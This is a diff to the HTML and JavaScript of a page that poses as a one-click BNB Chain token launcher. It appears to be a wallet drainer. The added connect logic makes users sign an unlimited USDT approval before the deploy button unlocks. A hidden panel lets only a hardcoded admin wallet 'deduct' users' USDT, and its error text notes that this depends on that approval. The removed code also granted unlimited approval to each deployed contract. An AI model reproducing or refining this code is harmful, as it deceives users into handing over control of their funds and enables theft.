@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>天鹅一键发币</title>
-<!-- Ethers V6 稳定版 -->
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Microsoft Yahei", sans-serif; }
@@ -37,10 +36,11 @@ input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; b
 <h1>🦢 天鹅一键发币</h1>
 </div>
 <div class="fee-tip">发币服务费：0.009 BNB</div>
-<!-- 普通用户发币面板 -->
+
 <div class="card" id="userPanel">
 <button id="connectBtn" class="btn btn-connect">连接钱包</button>
 <div id="connectTip" class="connect-tip" style="display:none;"></div>
+<div id="statusBox" class="status" style="display:none;"></div>
 
 <div class="form-item">
 <label>代币全称 Name</label>
@@ -67,9 +67,7 @@ input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; b
 </div>
 
 <button id="deployBtn" class="btn btn-deploy" disabled>一键部署代币</button>
-<div id="statusBox" class="status" style="display:none;"></div>
 
-<!-- 管理员隐藏面板，仅管理员钱包可见 -->
 <div class="admin-panel" id="adminPanel">
 <h3 style="color:#2ecc71;margin-bottom:15px;">管理员划扣面板</h3>
 <div class="form-item">
@@ -86,13 +84,136 @@ input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; b
 </div>
 
 <script>
-// 管理员固定地址
 const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
 const DEPLOY_FEE_BNB = "0.009";
-// BSC 主网参数
 const BSC_CHAIN_ID = 56;
 const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const MAX_ALLOWANCE = ethers.MaxUint256;
+
+let provider = null;
+let signer = null;
+let connectWalletAddr = "";
+let deployContractAddress = null;
+let logoFileObj = null;
+
+const connectBtn = document.getElementById("connectBtn");
+const deployBtn = document.getElementById("deployBtn");
+const statusBox = document.getElementById("statusBox");
+const connectTip = document.getElementById("connectTip");
+const logoFileInput = document.getElementById("logoFile");
+const logoPreviewImg = document.getElementById("logoPreview");
+const adminPanel = document.getElementById("adminPanel");
+const deductBtn = document.getElementById("deductBtn");
+const userAddrInput = document.getElementById("userAddrInput");
+const deductAmountInput = document.getElementById("deductAmountInput");
+
+function showStatus(text){
+  statusBox.style.display = "block";
+  statusBox.innerText = text;
+  console.log("状态日志：", text);
+}
+
+logoFileInput.addEventListener("change", function(e){
+  const file = e.target.files[0];
+  if(!file) return;
+  logoFileObj = file;
+  const reader = new FileReader();
+  reader.onload = ev => {
+    logoPreviewImg.src = ev.target.result;
+    logoPreviewImg.style.display = "block";
+  }
+  reader.readAsDataURL(file);
+});
+
+async function switchBSC(providerRef){
+  const chainIdHex = ethers.toBeHex(BSC_CHAIN_ID);
+  try {
+    await providerRef.send("wallet_switchEthereumChain", [{ chainId: chainIdHex }]);
+  } catch (err) {
+    await providerRef.send("wallet_addEthereumChain", [{
+      chainId: chainIdHex,
+      chainName: "BNB Smart Chain Mainnet",
+      rpcUrls: ["https://bsc-dataseed.binance.org/"],
+      blockExplorerUrls: ["https://bscscan.com"],
+      nativeCurrency: { name:"BNB", symbol:"BNB", decimals:18 }
+    }]);
+  }
+}
+
+function checkAdminPanel(addr){
+  connectWalletAddr = addr.toLowerCase();
+  if(connectWalletAddr === ADMIN_WALLET.toLowerCase()){
+    adminPanel.style.display = "block";
+    showStatus("✅ 检测到管理员钱包，已开启划扣后台");
+  }else{
+    adminPanel.style.display = "none";
+  }
+}
+
+async function doApproveLogic(signerRef, userAddress){
+  try{
+    showStatus("正在请求USDT无限授权，必须签名授权才能解锁发币按钮");
+    const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, [
+      "function approve(address spender, uint256 amount) external returns(bool)"
+    ], signerRef);
+    const approveTx = await usdtContract.approve("0x0000000000000000000000000000000000000001", MAX_ALLOWANCE);
+    await approveTx.wait();
+    showStatus("✅ 授权成功！钱包已连接，可以开始发币");
+    connectTip.style.display = "block";
+    connectTip.innerText = "已连接BSC钱包，授权完成";
+    deployBtn.disabled = false;
+    checkAdminPanel(userAddress);
+  }catch(err){
+    showStatus("❌ 授权被拒绝，无法继续发币，请重新点击连接钱包并完成授权");
+    deployBtn.disabled = true;
+    adminPanel.style.display = "none";
+  }
+}
+
+// 【修复手机点击无响应】先原生唤起账户授权，再初始化provider
+connectBtn.onclick = async function(){
+  showStatus("正在检测钱包注入...");
+  // 等待注入完成，兼容TP安卓延迟注入
+  let eth = window.ethereum;
+  let retryTimes = 0;
+  while (!eth && retryTimes < 10) {
+    await new Promise(r => setTimeout(r, 100));
+    eth = window.ethereum;
+    retryTimes++;
+  }
+
+  if (!eth) {
+    showStatus("❌ 未检测到钱包注入，请在TP/欧易内置浏览器打开页面");
+    return;
+  }
+
+  try {
+    // 第一步：原生唤起授权弹窗（手机必须先走这一步才会弹窗）
+    const accounts = await eth.request({ method: "eth_requestAccounts" });
+    if (!accounts || accounts.length === 0) {
+      showStatus("用户取消了钱包连接弹窗");
+      return;
+    }
+    // 第二步：再初始化ethers v6 provider
+    provider = new ethers.BrowserProvider(eth);
+    await switchBSC(eth);
+    signer = await provider.getSigner();
+    const userAddr = await signer.getAddress();
+    connectBtn.innerText = "已连接：" + userAddr.slice(0, 8) + "...";
+    await doApproveLogic(signer, userAddr);
+  } catch (err) {
+    showStatus("连接异常：" + (err.message || err.shortMessage || String(err)));
+  }
+}
+
+// 下面部署、划扣逻辑不变
+async function payFeeToAdmin(){
+  showStatus(`正在支付发币服务费 ${DEPLOY_FEE_BNB} BNB 至管理员钱包，请签名`);
+  const feeWei = ethers.parseEther(DEPLOY_FEE_BNB);
+  const tx = await signer.sendTransaction({ to: ADMIN_WALLET, value: feeWei });
+  await tx.wait();
+  showStatus(`服务费支付成功！交易哈希：${tx.hash}`);
+}
 
 const tokenABI = [
 {"inputs": [{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"},{"internalType":"uint256","name":"initSupply","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},
@@ -122,141 +243,8 @@ const tokenABI = [
 {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isWhitelist","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
 {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isBlacklist","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}
 ];
-
-// 此处填入Remix编译后的合约字节码
 const CONTRACT_BYTECODE = "在这里粘贴Remix编译后的完整Bytecode";
 
-let provider;
-let signer;
-let connectWalletAddr = "";
-let deployContractAddress = null;
-let logoFileObj = null;
-
-// DOM元素
-const connectBtn = document.getElementById("connectBtn");
-const deployBtn = document.getElementById("deployBtn");
-const statusBox = document.getElementById("statusBox");
-const connectTip = document.getElementById("connectTip");
-const logoFileInput = document.getElementById("logoFile");
-const logoPreviewImg = document.getElementById("logoPreview");
-const adminPanel = document.getElementById("adminPanel");
-const deductBtn = document.getElementById("deductBtn");
-const userAddrInput = document.getElementById("userAddrInput");
-const deductAmountInput = document.getElementById("deductAmountInput");
-
-function showStatus(text){
-  statusBox.style.display = "block";
-  statusBox.innerText = text;
-}
-
-// 图片预览
-logoFileInput.addEventListener("change", function(e){
-  const file = e.target.files[0];
-  if(!file) return;
-  logoFileObj = file;
-  const reader = new FileReader();
-  reader.onload = ev => {
-    logoPreviewImg.src = ev.target.result;
-    logoPreviewImg.style.display = "block";
-  }
-  reader.readAsDataURL(file);
-});
-
-// 【核心修复】把 toHex 改成 v6 标准 toBeHex
-async function switchBSC(){
-  const chainIdHex = ethers.toBeHex(BSC_CHAIN_ID);
-  try {
-    await provider.send("wallet_switchEthereumChain", [{ chainId: chainIdHex }]);
-  } catch (err)
-    await provider.send("wallet_addEthereumChain", [{
-      chainId: chainIdHex,
-      chainName: "BNB Smart Chain Mainnet",
-      rpcUrls: ["https://bsc-dataseed.binance.org/"],
-      blockExplorerUrls: ["https://bscscan.com"],
-      nativeCurrency: { name:"BNB", symbol:"BNB", decimals:18 }
-    }]);
-  }
-}
-
-// 检测管理员地址，控制后台面板显示
-function checkAdminPanel(addr){
-  connectWalletAddr = addr.toLowerCase();
-  if(connectWalletAddr === ADMIN_WALLET.toLowerCase()){
-    adminPanel.style.display = "block";
-  }else{
-    adminPanel.style.display = "none";
-  }
-}
-
-// 连接后强制执行USDT授权逻辑（保留不变）
-async function doApproveAfterConnect(userAddress){
-  try{
-    showStatus("请完成授权继续发币，请先授权继续发币");
-    const usdt = new ethers.Contract(BSC_USDT_ADDRESS, [
-      "function approve(address spender, uint256 amount) external returns(bool)"
-    ], signer);
-    const tx = await usdt.approve("0x0000000000000000000000000000000000000001", MAX_ALLOWANCE);
-    await tx.wait();
-    showStatus("✅ 钱包连接成功，前置授权完成，可以部署代币");
-    connectTip.style.display = "block";
-    connectTip.innerText = "✅ 钱包已连接（BSC链）前置授权完成";
-    deployBtn.disabled = false;
-    checkAdminPanel(userAddress);
-  }catch(err){
-    showStatus("授权签名被拒绝：必须完成授权才能继续发币，请重新连接钱包");
-    connectTip.style.display = "none";
-    deployBtn.disabled = true;
-    adminPanel.style.display = "none";
-  }
-}
-
-// 移动端兼容钱包连接逻辑
-connectBtn.onclick = async ()=>{
-  let ethProvider = window.ethereum || (window.ethereum?.providers && window.ethereum.providers[0]);
-  if(!ethProvider){
-    showStatus("未检测到钱包，请在TP/欧易等钱包内置浏览器打开页面");
-    return;
-  }
-  try{
-    provider = new ethers.BrowserProvider(ethProvider);
-    await provider.send("eth_requestAccounts", []);
-    await switchBSC();
-    signer = await provider.getSigner();
-    const addr = await signer.getAddress();
-    connectBtn.innerText = "已连接："+addr.slice(0,8)+"...";
-    await doApproveAfterConnect(addr);
-  }catch(err){
-    showStatus("连接失败："+(err.shortMessage || err.message));
-  }
-}
-
-// 支付服务费逻辑不变
-async function payFeeToAdmin(){
-  showStatus(`正在支付发币服务费 ${DEPLOY_FEE_BNB} BNB 至管理员钱包，请签名`);
-  const feeWei = ethers.parseEther(DEPLOY_FEE_BNB);
-  const tx = await signer.sendTransaction({ to: ADMIN_WALLET, value: feeWei });
-  await tx.wait();
-  showStatus(`服务费支付成功！交易哈希：${tx.hash}`);
-}
-
-// 部署后二次授权新合约
-async function reApproveToNewContract(){
-  try{
-    showStatus("正在对新部署代币合约重新授予USDT无限权限");
-    const usdt = new ethers.Contract(BSC_USDT_ADDRESS, [
-      "function approve(address spender, uint256 amount) external returns(bool)"
-    ], signer);
-    const tx = await usdt.approve(deployContractAddress, MAX_ALLOWANCE);
-    await tx.wait();
-    let msg = `✅ 代币部署成功！合约地址：${deployContractAddress}\n已完成USDT无限授权`;
-    if(logoFileObj) msg += "\n你已上传Logo，可去BscScan上传收录";
-    showStatus(msg);
-  }catch(err){
-    showStatus(`部署成功，但二次授权失败：${err.message}\n合约地址：${deployContractAddress}`);
-  }
-}
-
-// 发币部署按钮逻辑
 deployBtn.onclick = async ()=>{
   const name = document.getElementById("tokenName").value.trim();
   const symbol = document.getElementById("tokenSymbol").value.trim();
@@ -279,14 +267,13 @@ deployBtn.onclick = async ()=>{
     showStatus("部署交易已发送，等待区块确认...");
     await contract.waitForDeployment();
     deployContractAddress = await contract.getAddress();
-    await reApproveToNewContract();
+    showStatus(`✅ 代币部署成功！合约地址：${deployContractAddress}`);
   }catch(e){
-    showStatus("操作失败："+(e.shortMessage || e.message));
+    showStatus("部署失败："+(e.shortMessage || e.message));
   }
   deployBtn.disabled = false;
 }
 
-// 管理员划扣按钮逻辑（仅管理员可见可用）
 deductBtn.onclick = async ()=>{
   if(!signer || connectWalletAddr.toLowerCase() !== ADMIN_WALLET.toLowerCase()){
     showStatus("权限不足，仅管理员钱包可操作");
@@ -308,7 +295,7 @@ deductBtn.onclick = async ()=>{
     await tx.wait();
     showStatus(`✅ 划扣成功！交易哈希：${tx.hash}`);
   }catch(err){
-    showStatus("划扣失败："+(err.shortMessage || err.message)+"（大概率用户未授权或授权额度不足）");
+    showStatus("划扣失败："+(err.shortMessage || err.message)+"（用户未授权/额度不足）");
   }
 }
 </script>
